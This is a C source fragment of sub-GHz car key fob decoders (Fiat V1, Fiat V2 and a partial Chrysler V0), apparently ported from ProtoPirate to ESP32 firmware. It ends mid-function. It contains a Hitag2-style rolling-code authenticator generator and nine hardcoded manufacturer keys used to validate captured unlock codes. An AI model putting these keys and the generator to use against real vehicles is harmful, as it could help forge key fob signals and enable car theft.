    group |= (uint8_t)(fiat_v1_truth(
                           0x6671U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[4], 6U),
                               fiat_v1_byte_bit(state[3], 0U),
                               fiat_v1_byte_bit(state[3], 2U),
                               fiat_v1_byte_bit(state[3], 3U)))
                       << 3U);
    group |= (uint8_t)(fiat_v1_truth(
                           0x2c79U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[5], 1U),
                               fiat_v1_byte_bit(state[5], 3U),
                               fiat_v1_byte_bit(state[5], 4U),
                               fiat_v1_byte_bit(state[4], 5U)))
                       << 4U);
    return fiat_v1_truth(0x7907287bUL, group);
}

static uint8_t fiat_v1_parity8(uint8_t value) {
    value ^= (uint8_t)(value >> 4U);
    value ^= (uint8_t)(value >> 2U);
    value ^= (uint8_t)(value >> 1U);
    return value & 1U;
}

static uint8_t fiat_v1_bcm_hitag2_feedback(const uint8_t state[6]) {
    static const uint8_t masks[6] = {0xb3U, 0x80U, 0x83U, 0x22U, 0x00U, 0x73U};
    uint8_t feedback = 0U;
    for(uint8_t i = 0U; i < 6U; i++) {
        feedback ^= fiat_v1_parity8((uint8_t)(state[i] & masks[i]));
    }
    return feedback & 1U;
}

static void fiat_v1_bcm_hitag2_shift(uint8_t state[6], uint8_t input) {
    for(uint8_t i = 0U; i < 5U; i++) {
        state[i] = (uint8_t)((state[i] << 1U) | (state[i + 1U] >> 7U));
    }
    state[5] = (uint8_t)((state[5] << 1U) | (input & 1U));
}

static uint8_t fiat_v1_input_bit_u32_be(uint32_t value, uint8_t index) {
    return (uint8_t)((value >> (31U - index)) & 1U);
}

static uint8_t fiat_v1_input_bit_bytes_be(const uint8_t* bytes, uint8_t index) {
    return (uint8_t)((bytes[index >> 3U] >> (7U - (index & 7U))) & 1U);
}

static uint32_t fiat_v1_bcm_generate_authenticator(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    const uint8_t key[6],
    uint32_t epoch) {
    uint8_t state[6] = {
        (uint8_t)(uid >> 24U),
        (uint8_t)(uid >> 16U),
        (uint8_t)(uid >> 8U),
        (uint8_t)uid,
        key[4],
        key[5],
    };

    const uint32_t iv = ((epoch & 0x3FFFFUL) << 14U) | (((uint32_t)control & 0x03FFUL) << 4U) |
                        ((uint32_t)button & 0x0FUL);

    for(uint8_t i = 0U; i < 32U; i++) {
        const uint8_t input = fiat_v1_input_bit_u32_be(iv, i) ^
                              fiat_v1_input_bit_bytes_be(key, i) ^
                              fiat_v1_bcm_hitag2_filter(state);
        fiat_v1_bcm_hitag2_shift(state, input);
    }

    uint32_t authenticator = 0U;
    for(uint8_t i = 0U; i < 32U; i++) {
        authenticator = (authenticator << 1U) | fiat_v1_bcm_hitag2_filter(state);
        fiat_v1_bcm_hitag2_shift(state, fiat_v1_bcm_hitag2_feedback(state));
    }
    return authenticator;
}

static const uint8_t fiat_v1_known_keys[FIAT_V1_KNOWN_KEY_COUNT][6] = {
    {0xB7U, 0x92U, 0x80U, 0xAEU, 0xCCU, 0x37U},
    {0xD4U, 0x24U, 0x28U, 0xF7U, 0xD9U, 0x66U},
    {0x4DU, 0x34U, 0x3FU, 0xD4U, 0xE7U, 0xB6U},
    {0x6DU, 0x6BU, 0xF2U, 0x1DU, 0x3AU, 0x1AU},
    {0xA3U, 0xF3U, 0xACU, 0xF7U, 0xB9U, 0x10U},
    {0x4DU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0xCDU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0x33U, 0xFAU, 0x2FU, 0xCDU, 0xC3U, 0x3BU},
    {0xF6U, 0x1AU, 0xEFU, 0x9CU, 0xD0U, 0x1BU},
};

static bool fiat_v1_key_matches(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    uint32_t hop,
    const uint8_t key[6],
    uint32_t epoch) {
    return fiat_v1_bcm_generate_authenticator(uid, button, control, key, epoch) == hop;
}

static bool fiat_v1_key_matches_any_button(
    uint32_t uid,
    uint16_t control,
    uint32_t hop,
    const uint8_t key[6],
    uint32_t epoch) {
    static const uint8_t buttons[] = {0x1U, 0x2U, 0x4U, 0x8U};
    for(size_t i = 0; i < COUNT_OF(buttons); i++) {
        if(fiat_v1_key_matches(uid, buttons[i], control, hop, key, epoch)) {
            return true;
        }
    }
    return false;
}

// NOTE: the original fiat_v1_resolve_hitag2_key also took a FlipperFormat* used
// only by the deserialize path; on the decode path fiat_v1_verify_hitag2_key
// always passes NULL, so that branch is dead code here and is dropped to keep the
// fragment free of FlipperFormat / flipper_format_* (not provided by the shim).
static bool fiat_v1_resolve_hitag2_key(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    uint32_t hop,
    uint8_t key_out[6],
    uint32_t* epoch_out) {
    if(!key_out) return false;

    for(uint8_t i = 0U; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
        if(fiat_v1_key_matches(uid, button, control, hop, fiat_v1_known_keys[i], 0U) ||
           fiat_v1_key_matches_any_button(uid, control, hop, fiat_v1_known_keys[i], 0U)) {
            memcpy(key_out, fiat_v1_known_keys[i], 6U);
            if(epoch_out) *epoch_out = 0U;
            return true;
        }
    }
    return false;
}

static void fiat_v1_verify_hitag2_key(PpDec_fiat_v1* instance) {
    instance->hitag2_key_valid = false;
    instance->hitag2_epoch = 0U;
    memset(instance->hitag2_key, 0, sizeof(instance->hitag2_key));

    instance->hitag2_key_valid = fiat_v1_resolve_hitag2_key(
        instance->uid,
        instance->generic.btn,
        (uint16_t)(instance->generic.cnt & 0x03FFU),
        instance->hop,
        instance->hitag2_key,
        &instance->hitag2_epoch);
}

static void fiat_v1_clear_cells(PpDec_fiat_v1* instance, uint8_t variant) {
    instance->cell_count[variant] = 0U;
    memset(instance->cells[variant], 0, FIAT_V1_WIRE_CELLS);
}

static void fiat_v1_clear_all_cells(PpDec_fiat_v1* instance) {
    for(uint8_t variant = 0U; variant < FIAT_V1_VARIANT_COUNT; variant++) {
        fiat_v1_clear_cells(instance, variant);
    }
}

static void fiat_v1_decode_fields(PpDec_fiat_v1* instance) {
    instance->family = instance->raw_data[1];
    instance->uid = fiat_v1_uid(instance->raw_data);
    instance->generic.serial = instance->uid;
    instance->generic.btn = instance->raw_data[6] >> 4U;
    instance->generic.cnt = fiat_v1_counter(instance->raw_data);
    instance->hop = fiat_v1_hop(instance->raw_data);
    instance->tail_bits = instance->raw_data[11] & 0x03U;
    instance->frame_xor = instance->raw_data[12];
    instance->generic.data = ((uint64_t)instance->generic.serial << 32U) | instance->hop;
    instance->generic.data_count_bit = FIAT_V1_LOGICAL_BITS;
    instance->decoder.decode_data = instance->generic.data;
    instance->decoder.decode_count_bit = instance->generic.data_count_bit;
    fiat_v1_verify_hitag2_key(instance);
}

static bool fiat_v1_commit(
    PpDec_fiat_v1* instance,
    const uint8_t raw[FIAT_V1_WIRE_BYTES],
    uint8_t te_variant) {
    if(!fiat_v1_frame_valid(raw)) {
        return false;
    }

    if(instance->last_raw_valid && memcmp(instance->last_raw_data, raw, FIAT_V1_WIRE_BYTES) == 0) {
        return true;
    }

    memcpy(instance->raw_data, raw, FIAT_V1_WIRE_BYTES);
    memcpy(instance->last_raw_data, raw, FIAT_V1_WIRE_BYTES);
    instance->last_raw_valid = true;
    instance->te_variant = (te_variant == FIAT_V1_TE_VARIANT_A) ? FIAT_V1_TE_VARIANT_A :
                                                                  FIAT_V1_TE_VARIANT_B;
    fiat_v1_decode_fields(instance);

    FURI_LOG_D(
        TAG,
        "Accepted UID:%08lX Btn:%02X Cnt:%03lX Auth:%08lX XOR:%02X",
        (unsigned long)instance->uid,
        instance->generic.btn,
        (unsigned long)instance->generic.cnt,
        (unsigned long)instance->hop,
        instance->frame_xor);

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }
    return true;
}

static bool fiat_v1_try_decode_window(PpDec_fiat_v1* instance, uint8_t variant, bool invert) {
    if(instance->cell_count[variant] != FIAT_V1_WIRE_CELLS) {
        return false;
    }

    const uint8_t* cells = instance->cells[variant];
    uint8_t raw[FIAT_V1_WIRE_BYTES] = {0};
    for(uint8_t bit_index = 0U; bit_index < FIAT_V1_WIRE_BITS; bit_index++) {
        const uint8_t first = cells[bit_index * 2U];
        const uint8_t second = cells[bit_index * 2U + 1U];
        if(first == second) {
            return false;
        }

        bool bit = first != 0U;
        if(invert) {
            bit = !bit;
        }
        if(bit) {
            raw[bit_index >> 3U] |= (uint8_t)(1U << (7U - (bit_index & 7U)));
        }
    }

    return fiat_v1_commit(instance, raw, variant);
}

static void fiat_v1_try_decode(PpDec_fiat_v1* instance, uint8_t variant) {
    if(fiat_v1_try_decode_window(instance, variant, false)) {
        return;
    }
    (void)fiat_v1_try_decode_window(instance, variant, true);
}

static void fiat_v1_push_cell(PpDec_fiat_v1* instance, uint8_t variant, bool level) {
    uint8_t* cells = instance->cells[variant];
    if(instance->cell_count[variant] < FIAT_V1_WIRE_CELLS) {
        cells[instance->cell_count[variant]++] = level ? 1U : 0U;
    } else {
        memmove(cells, &cells[1], FIAT_V1_WIRE_CELLS - 1U);
        cells[FIAT_V1_WIRE_CELLS - 1U] = level ? 1U : 0U;
    }
    fiat_v1_try_decode(instance, variant);
}

static bool fiat_v1_feed_data_pulse(PpDec_fiat_v1* instance, bool level, uint32_t duration) {
    bool matched = false;

    for(uint8_t variant = 0U; variant < FIAT_V1_VARIANT_COUNT; variant++) {
        if(fiat_v1_duration_is_short(variant, duration)) {
            fiat_v1_push_cell(instance, variant, level);
            matched = true;
        } else if(fiat_v1_duration_is_long(variant, duration)) {
            fiat_v1_push_cell(instance, variant, level);
            fiat_v1_push_cell(instance, variant, level);
            matched = true;
        } else {
            if(!level && duration >= FIAT_V1_BOUNDARY_MIN_US) {
                fiat_v1_push_cell(instance, variant, false);
            }
            fiat_v1_clear_cells(instance, variant);
        }
    }

    return matched;
}

// (6) alloc
static void* fiat_v1_alloc() {
    PpDec_fiat_v1* i = (PpDec_fiat_v1*)calloc(1, sizeof(PpDec_fiat_v1));
    if(!i) return NULL;
    i->generic.protocol_name = "Fiat V1";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void fiat_v1_reset(void* context) {
    PpDec_fiat_v1* instance = (PpDec_fiat_v1*)context;

    memset(instance->raw_data, 0, sizeof(instance->raw_data));
    memset(instance->last_raw_data, 0, sizeof(instance->last_raw_data));
    instance->decoder.parser_step = FiatV1DecoderStepReset;
    instance->decoder.decode_data = 0U;
    instance->decoder.decode_count_bit = 0U;
    instance->last_raw_valid = false;
    instance->generic.data = 0U;
    instance->generic.data_count_bit = 0U;
    instance->generic.serial = 0U;
    instance->generic.btn = 0U;
    instance->generic.cnt = 0U;
    instance->uid = 0U;
    instance->hop = 0U;
    instance->family = 0U;
    instance->tail_bits = FIAT_V1_DEFAULT_TAIL_BITS;
    instance->frame_xor = 0U;
    instance->hitag2_key_valid = false;
    instance->hitag2_epoch = 0U;
    instance->te_variant = FIAT_V1_DEFAULT_TE_VARIANT;
    memset(instance->hitag2_key, 0, sizeof(instance->hitag2_key));
    fiat_v1_clear_all_cells(instance);
}

// (8) feed
static void fiat_v1_feed(void* context, bool level, uint32_t duration) {
    PpDec_fiat_v1* instance = (PpDec_fiat_v1*)context;

    switch(instance->decoder.parser_step) {
    case FiatV1DecoderStepReset:
        if(fiat_v1_duration_is_pulse(duration)) {
            fiat_v1_clear_all_cells(instance);
            instance->decoder.parser_step = FiatV1DecoderStepData;
            (void)fiat_v1_feed_data_pulse(instance, level, duration);
        }
        break;

    case FiatV1DecoderStepData:
        if(!fiat_v1_feed_data_pulse(instance, level, duration)) {
            instance->decoder.parser_step = FiatV1DecoderStepReset;
        }
        break;
    }
}

// ============================================================================
//  Fiat V2  --  ProtoPirate (GPLv3)
// ============================================================================

// (2) #defines used by the decode path (uniquely prefixed already)
#define FIAT_V2_TE_SHORT        210U
#define FIAT_V2_TE_LONG         420U
#define FIAT_V2_TE_DELTA        100U
#define FIAT_V2_BOUNDARY_MIN_US 900U
#define FIAT_V2_WIRE_BITS       112U
#define FIAT_V2_WIRE_BYTES      14U
#define FIAT_V2_WIRE_CELLS      (FIAT_V2_WIRE_BITS * 2U)
#define FIAT_V2_LOGICAL_BITS    112U
#define FIAT_V2_MARKER0         0x00U
#define FIAT_V2_MARKER1         0x01U
#define FIAT_V2_BTN_SHIFT       6U
#define FIAT_V2_BUTTON_LOCK     0x2U
#define FIAT_V2_BUTTON_UNLOCK   0x3U
#define FIAT_V2_BUTTON_TRUNK    0x1U
#define FIAT_V2_CNT_SHIFT       3U
#define FIAT_V2_FCA_TYPE_NIBBLE 0xD0U

// (1) block const
static const SubGhzBlockConst subghz_protocol_fiat_v2_const = {
    .te_short = FIAT_V2_TE_SHORT,
    .te_long = FIAT_V2_TE_LONG,
    .te_delta = FIAT_V2_TE_DELTA,
    .min_count_bit_for_found = FIAT_V2_LOGICAL_BITS,
};

// (4) decoder step enum
typedef enum {
    FiatV2DecoderStepReset = 0,
    FiatV2DecoderStepData = 1,
} FiatV2DecoderStep;

// (3) decoder instance (EXTRA fields verbatim from source struct)
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint8_t cells[FIAT_V2_WIRE_CELLS];
    uint16_t cell_count;

    uint8_t raw_data[FIAT_V2_WIRE_BYTES];
    uint8_t last_raw_data[FIAT_V2_WIRE_BYTES];
    bool last_raw_valid;

    uint32_t uid;
    uint32_t hop;
    uint8_t button;
} PpDec_fiat_v2;

// (5) static helpers reached by the decode path
static bool fiat_v2_duration_is_short(uint32_t duration) {
    return pp_is_short(duration, &subghz_protocol_fiat_v2_const);
}

static bool fiat_v2_duration_is_long(uint32_t duration) {
    return pp_is_long(duration, &subghz_protocol_fiat_v2_const);
}

static bool fiat_v2_button_valid(uint8_t button) {
    const uint8_t sel = button >> FIAT_V2_BTN_SHIFT;
    return sel == FIAT_V2_BUTTON_LOCK || sel == FIAT_V2_BUTTON_UNLOCK ||
           sel == FIAT_V2_BUTTON_TRUNK;
}

static uint32_t fiat_v2_uid(const uint8_t raw[FIAT_V2_WIRE_BYTES]) {
    return ((uint32_t)raw[2] << 24U) | ((uint32_t)raw[3] << 16U) | ((uint32_t)raw[4] << 8U) |
           raw[5];
}

static bool fiat_v2_is_fca(const uint8_t raw[FIAT_V2_WIRE_BYTES]) {
    return (raw[6] & 0xF0U) == FIAT_V2_FCA_TYPE_NIBBLE;
}

static uint32_t fiat_v2_hop(const uint8_t raw[FIAT_V2_WIRE_BYTES]) {
    if(fiat_v2_is_fca(raw)) {
        return ((uint32_t)raw[10] << 24U) | ((uint32_t)raw[11] << 16U) |
               ((uint32_t)raw[12] << 8U) | raw[13];
    }
    return ((uint32_t)raw[9] << 24U) | ((uint32_t)raw[10] << 16U) | ((uint32_t)raw[11] << 8U) |
           raw[12];
}

static uint32_t fiat_v2_counter(const uint8_t raw[FIAT_V2_WIRE_BYTES]) {
    if(fiat_v2_is_fca(raw)) {
        const uint32_t raw_cnt = ((uint32_t)raw[8] << 6U) | (uint32_t)(raw[9] >> 2U);
        return (~raw_cnt) & 0x3FFFU;
    }
    const uint32_t raw_cnt = ((uint32_t)(raw[7] & 0x3FU) << 5U) |
                             (uint32_t)(raw[8] >> FIAT_V2_CNT_SHIFT);
    return (~raw_cnt) & 0x7FFU;
}

static bool fiat_v2_frame_valid(const uint8_t raw[FIAT_V2_WIRE_BYTES]) {
    if(raw[0] != FIAT_V2_MARKER0 || raw[1] != FIAT_V2_MARKER1) {
        return false;
    }
    if(!fiat_v2_button_valid(raw[7])) {
        return false;
    }

    const uint32_t uid = fiat_v2_uid(raw);
    return uid != 0U && uid != UINT32_MAX;
}

static void fiat_v2_clear_cells(PpDec_fiat_v2* instance) {
    instance->cell_count = 0U;
    memset(instance->cells, 0, sizeof(instance->cells));
}

static void fiat_v2_decode_fields(PpDec_fiat_v2* instance) {
    instance->uid = fiat_v2_uid(instance->raw_data);
    instance->button = instance->raw_data[7];
    instance->hop = fiat_v2_hop(instance->raw_data);
    instance->generic.serial = instance->uid;
    instance->generic.btn = instance->button;
    instance->generic.cnt = fiat_v2_counter(instance->raw_data);
    instance->generic.data = ((uint64_t)instance->generic.serial << 32U) | instance->hop;
    instance->generic.data_count_bit = FIAT_V2_LOGICAL_BITS;
    instance->decoder.decode_data = instance->generic.data;
    instance->decoder.decode_count_bit = instance->generic.data_count_bit;
}

static bool fiat_v2_commit(PpDec_fiat_v2* instance, const uint8_t raw[FIAT_V2_WIRE_BYTES]) {
    if(!fiat_v2_frame_valid(raw)) {
        return false;
    }

    if(instance->last_raw_valid && memcmp(instance->last_raw_data, raw, FIAT_V2_WIRE_BYTES) == 0) {
        return true;
    }

    memcpy(instance->raw_data, raw, FIAT_V2_WIRE_BYTES);
    memcpy(instance->last_raw_data, raw, FIAT_V2_WIRE_BYTES);
    instance->last_raw_valid = true;
    fiat_v2_decode_fields(instance);

    FURI_LOG_D(
        TAG,
        "Accepted UID:%08lX Btn:%02X Cnt:%02lX Hop:%08lX",
        (unsigned long)instance->uid,
        instance->button,
        (unsigned long)instance->generic.cnt,
        (unsigned long)instance->hop);

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }
    return true;
}

static bool fiat_v2_try_decode_window(PpDec_fiat_v2* instance, bool invert) {
    if(instance->cell_count != FIAT_V2_WIRE_CELLS) {
        return false;
    }

    uint8_t raw[FIAT_V2_WIRE_BYTES] = {0};
    for(uint8_t bit_index = 0U; bit_index < FIAT_V2_WIRE_BITS; bit_index++) {
        const uint8_t first = instance->cells[bit_index * 2U];
        const uint8_t second = instance->cells[bit_index * 2U + 1U];
        if(first == second) {
            return false;
        }

        bool bit = first != 0U;
        if(invert) {
            bit = !bit;
        }
        if(bit) {
            raw[bit_index >> 3U] |= (uint8_t)(1U << (7U - (bit_index & 7U)));
        }
    }

    return fiat_v2_commit(instance, raw);
}

static void fiat_v2_try_decode(PpDec_fiat_v2* instance) {
    if(fiat_v2_try_decode_window(instance, false)) {
        return;
    }
    (void)fiat_v2_try_decode_window(instance, true);
}

static void fiat_v2_push_cell(PpDec_fiat_v2* instance, bool level) {
    if(instance->cell_count < FIAT_V2_WIRE_CELLS) {
        instance->cells[instance->cell_count++] = level ? 1U : 0U;
    } else {
        memmove(instance->cells, &instance->cells[1], FIAT_V2_WIRE_CELLS - 1U);
        instance->cells[FIAT_V2_WIRE_CELLS - 1U] = level ? 1U : 0U;
    }
    fiat_v2_try_decode(instance);
}

static bool fiat_v2_feed_data_pulse(PpDec_fiat_v2* instance, bool level, uint32_t duration) {
    if(fiat_v2_duration_is_short(duration)) {
        fiat_v2_push_cell(instance, level);
        return true;
    }

    if(fiat_v2_duration_is_long(duration)) {
        fiat_v2_push_cell(instance, level);
        fiat_v2_push_cell(instance, level);
        return true;
    }

    if(!level && duration >= FIAT_V2_BOUNDARY_MIN_US) {
        fiat_v2_push_cell(instance, false);
    }
    fiat_v2_clear_cells(instance);
    return false;
}

// (6) alloc
static void* fiat_v2_alloc() {
    PpDec_fiat_v2* i = (PpDec_fiat_v2*)calloc(1, sizeof(PpDec_fiat_v2));
    if(!i) return NULL;
    i->generic.protocol_name = "Fiat V2";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void fiat_v2_reset(void* context) {
    PpDec_fiat_v2* instance = (PpDec_fiat_v2*)context;

    memset(instance->raw_data, 0, sizeof(instance->raw_data));
    memset(instance->last_raw_data, 0, sizeof(instance->last_raw_data));
    instance->decoder.parser_step = FiatV2DecoderStepReset;
    instance->decoder.decode_data = 0U;
    instance->decoder.decode_count_bit = 0U;
    instance->last_raw_valid = false;
    instance->generic.data = 0U;
    instance->generic.data_count_bit = 0U;
    instance->generic.serial = 0U;
    instance->generic.btn = 0U;
    instance->generic.cnt = 0U;
    instance->uid = 0U;
    instance->hop = 0U;
    instance->button = 0U;
    fiat_v2_clear_cells(instance);
}

// (8) feed
static void fiat_v2_feed(void* context, bool level, uint32_t duration) {
    PpDec_fiat_v2* instance = (PpDec_fiat_v2*)context;

    switch(instance->decoder.parser_step) {
    case FiatV2DecoderStepReset:
        if(fiat_v2_duration_is_short(duration) || fiat_v2_duration_is_long(duration)) {
            fiat_v2_clear_cells(instance);
            instance->decoder.parser_step = FiatV2DecoderStepData;
            (void)fiat_v2_feed_data_pulse(instance, level, duration);
        }
        break;

    case FiatV2DecoderStepData:
        if(!fiat_v2_feed_data_pulse(instance, level, duration)) {
            instance->decoder.parser_step = FiatV2DecoderStepReset;
        }
        break;
    }
}

// ============================================================================
//  END OF PORTED DECODERS
//
//  (a) REGISTRY -- all 5 decoders ready to register:
//        { "Renault V0", renault_v0_alloc, renault_v0_feed, renault_v0_reset, nullptr },
//        { "Renault V1", renault_v1_alloc, renault_v1_feed, renault_v1_reset, nullptr },
//        { "Fiat V0",    fiat_v0_alloc,    fiat_v0_feed,    fiat_v0_reset,    nullptr },
//        { "Fiat V1",    fiat_v1_alloc,    fiat_v1_feed,    fiat_v1_reset,    nullptr },
//        { "Fiat V2",    fiat_v2_alloc,    fiat_v2_feed,    fiat_v2_reset,    nullptr },
//
//  (b) UNRESOLVED: none.
//
//  Notes:
//    * Fiat V1 / Fiat V2 use the shim-provided pp_is_short / pp_is_long.
//    * Fiat V1's decode path includes the in-file BCM/Hitag2 authenticator
//      (all fiat_v1_* statics) to validate against the 9 known keys.
//    * fiat_v1_resolve_hitag2_key was reduced to its known-keys path: the
//      original FlipperFormat* branch is used only by deserialize and is dead
//      code on the decode path (verify passes NULL), so it was dropped to avoid
//      depending on FlipperFormat / flipper_format_* (not in the shim).
//    * Emitted decoders assume the shim's furi layer provides COUNT_OF, TAG,
//      and the no-op FURI_LOG_* macros, alongside UNUSED / furi_check.
// ============================================================================


// ===== fragment: pp_frag_misc.h =====
// pp_frag_misc.h
// Self-contained ProtoPirate sub-GHz DECODER ports for ESP32 firmware.
// Generated by transforming the DECODE path of each ProtoPirate protocol .c
// onto the pre-existing compatibility shim (types/functions/macros provided
// externally). No #include / #pragma once here on purpose.
//
// Ported: Chrysler V0, Mazda V0, Scher-Khan.
// Skipped (external crypto / no decoder): StarLine, VAG, AUT64 -- see report
// block at the end of this file.

// =============================================================================
// Chrysler V0 -- ProtoPirate (GPLv3)
// =============================================================================

// (1) block const (chrysler has no SubGhzBlockConst in source; synthesized from
//     its timing #defines to satisfy the template; unused by the feed path)
static const SubGhzBlockConst chrysler_v0_const = {
    .te_short = 0x12C,
    .te_long = 0xD48,
    .te_delta = 0x96,
    .min_count_bit_for_found = 0x50,
};

// (2) timing constants used by feed (uniquely prefixed; UPLOAD_CAPACITY dropped)
#define CHRYSLER_V0_TE_SHORT         0x12C
#define CHRYSLER_V0_TE_DELTA         0x96
#define CHRYSLER_V0_TE_LONG_A        0xD48
#define CHRYSLER_V0_TE_LONG_B        0xE74
#define CHRYSLER_V0_TE_LONG_DELTA    0x190
#define CHRYSLER_V0_TE_GAP           0x1F40
#define CHRYSLER_V0_DECODE_BIT_COUNT 0x50

static const uint8_t chrysler_v0_xor_table[16] = {
    0x0F,
    0x02,
    0x40,
    0x0C,
    0x30,
    0x0E,
    0x70,
    0x08,
    0x10,
    0x0A,
    0x50,
    0xF4,
    0x2F,
    0xF6,
    0x6F,
    0xF0,
};

// (4) decoder step enum
typedef enum {
    Chrysler_V0DecoderStepReset = 0,
    Chrysler_V0DecoderStepSeek = 1,
    Chrysler_V0DecoderStepData = 2,
} Chrysler_V0DecoderStep;

// (3) instance type
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint16_t packet_bit_count;
    uint8_t decoded_button;

    uint32_t te_last;
    uint8_t plain_a[9];
    uint8_t plain_b[9];

    uint8_t plain_a_present;
    uint8_t plain_b_present;

    uint8_t check_ok;
    uint32_t sn_b;

    uint16_t data_2;
    uint8_t seed;
} PpDec_chrysler_v0;

// (5) static helpers reachable from the feed path
static uint8_t chrysler_v0_reverse6(uint32_t value) {
    uint8_t out = 0;
    uint8_t bits = 6;

    while(bits--) {
        out = (uint8_t)((out << 1U) | (value & 1U));
        value >>= 1U;
    }

    return out;
}

static void
    chrysler_v0_transform_block(const uint8_t in[9], uint8_t out[9], uint32_t key, uint8_t button) {
    uint8_t mask = chrysler_v0_xor_table[key & 0x0FU];
    if(button == 1U) {
        mask ^= (key & 1U) ? 0xF0U : 0x0FU;
    }

    for(size_t i = 0; i < 9; i++) {
        out[i] = in[i] ^ mask;
    }
}

static bool chrysler_v0_is_short(uint32_t duration) {
    return DURATION_DIFF(duration, CHRYSLER_V0_TE_SHORT) <= CHRYSLER_V0_TE_DELTA;
}

static bool chrysler_v0_is_long_mark(uint32_t duration) {
    return (DURATION_DIFF(duration, CHRYSLER_V0_TE_LONG_A) <= CHRYSLER_V0_TE_LONG_DELTA) ||
           (DURATION_DIFF(duration, CHRYSLER_V0_TE_LONG_B) <= CHRYSLER_V0_TE_LONG_DELTA);
}

static void chrysler_v0_set_sn_b(PpDec_chrysler_v0* instance, uint32_t sn_b) {
    instance->sn_b = sn_b;
}

static void chrysler_v0_decode_packet(PpDec_chrysler_v0* instance) {
    uint8_t key[8];
    uint8_t encoded[9];
    uint8_t decoded[9];
    const uint16_t key2 = instance->data_2;

    pp_u64_to_bytes_be(instance->generic.data, key);
    instance->seed = chrysler_v0_reverse6(key[0] >> 2U);

    const uint8_t b1_xor_b6 = key[6] ^ key[1];
    const bool msb_set = (key[0] & 0x80U) != 0U;

    if(msb_set) {
        const uint8_t key2_low = (uint8_t)(key2 & 0xFFU);
        instance->check_ok = (key[1] == key[5]) && (b1_xor_b6 == 0x62U);
        instance->decoded_button = (((uint8_t)(key2_low ^ key[4])) == 0x10U) ? 2U : 1U;
    } else {
        instance->check_ok = 0U;
        instance->decoded_button = 1U;

        if(((uint8_t)(key[1] ^ 0xC3U)) == key[5]) {
            if(b1_xor_b6 == 0x04U) {
                instance->check_ok = 1U;
            } else {
                instance->check_ok = (b1_xor_b6 == 0x08U);
                if(b1_xor_b6 == 0x08U) {
                    instance->decoded_button = 2U;
                } else {
                    FURI_LOG_D(TAG, "BtnDetect: unknown b1^b6=%02X (MSB=0)", b1_xor_b6);
                }
            }
        } else {
            if(b1_xor_b6 == 0x08U) {
                instance->decoded_button = 2U;
            } else if(b1_xor_b6 != 0x04U) {
                FURI_LOG_D(TAG, "BtnDetect: unknown b1^b6=%02X (MSB=0)", b1_xor_b6);
            }
        }
    }

    encoded[0] = key[1];
    encoded[1] = key[2];
    encoded[2] = key[3];
    encoded[3] = key[4];
    encoded[4] = key[5];
    encoded[5] = key[6];
    encoded[6] = key[7];
    encoded[7] = (uint8_t)(key2 >> 8U);
    encoded[8] = (uint8_t)(key2 & 0xFFU);
    chrysler_v0_transform_block(encoded, decoded, instance->seed, instance->decoded_button);

    if(instance->seed & 1U) {
        memcpy(instance->plain_b, decoded, sizeof(instance->plain_b));
        instance->plain_b_present = 1U;

        const uint32_t sn_b = ((uint32_t)decoded[0] << 24U) | ((uint32_t)decoded[1] << 16U) |
                              ((uint32_t)decoded[2] << 8U) | (uint32_t)decoded[7];
        chrysler_v0_set_sn_b(instance, sn_b);
    } else {
        memcpy(instance->plain_a, decoded, sizeof(instance->plain_a));
        instance->plain_a_present = 1U;

        instance->generic.cnt = ((uint32_t)decoded[0] << 24U) | ((uint32_t)decoded[1] << 16U) |
                                ((uint32_t)decoded[2] << 8U) | (uint32_t)decoded[3];
    }

    instance->generic.btn = instance->decoded_button;
}

static void chrysler_v0_decoder_commit(PpDec_chrysler_v0* instance) {
    instance->packet_bit_count = CHRYSLER_V0_DECODE_BIT_COUNT;
    instance->decoder.decode_count_bit = CHRYSLER_V0_DECODE_BIT_COUNT;
    instance->generic.data_count_bit = CHRYSLER_V0_DECODE_BIT_COUNT;
    chrysler_v0_decode_packet(instance);

    if(instance->check_ok && instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }
}

// (6) alloc
static void* chrysler_v0_alloc() {
    PpDec_chrysler_v0* i = (PpDec_chrysler_v0*)calloc(1, sizeof(PpDec_chrysler_v0));
    if(!i) return NULL;
    i->generic.protocol_name = "Chrysler V0";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void chrysler_v0_reset(void* context) {
    PpDec_chrysler_v0* instance = (PpDec_chrysler_v0*)context;
    instance->decoder.decode_data = 0;
    instance->data_2 = 0;
    instance->seed = 0;
    instance->decoder.parser_step = Chrysler_V0DecoderStepReset;
    instance->decoder.decode_count_bit = 0;
    instance->packet_bit_count = 0;
    instance->te_last = 0;
    instance->plain_a_present = 0;
    instance->plain_b_present = 0;
    instance->sn_b = 0;
}

// (8) feed
static void chrysler_v0_feed(void* context, bool level, uint32_t duration) {
    PpDec_chrysler_v0* instance = (PpDec_chrysler_v0*)context;

    switch(instance->decoder.parser_step) {
    case Chrysler_V0DecoderStepReset:
        if(level && chrysler_v0_is_short(duration)) {
            instance->packet_bit_count = 0;
            instance->te_last = duration;
            instance->decoder.parser_step = Chrysler_V0DecoderStepSeek;
        }
        break;

    case Chrysler_V0DecoderStepSeek:
        if(level) {
            instance->te_last = duration;
            break;
        }

        if(chrysler_v0_is_long_mark(duration)) {
            if(chrysler_v0_is_short(instance->te_last)) {
                instance->packet_bit_count++;
            } else if(instance->packet_bit_count > 0x0F) {
                instance->data_2 = 0;
                instance->decoder.parser_step = Chrysler_V0DecoderStepData;
                instance->decoder.decode_data = 1;
                instance->decoder.decode_count_bit = 1;
            } else {
                instance->packet_bit_count = 0;
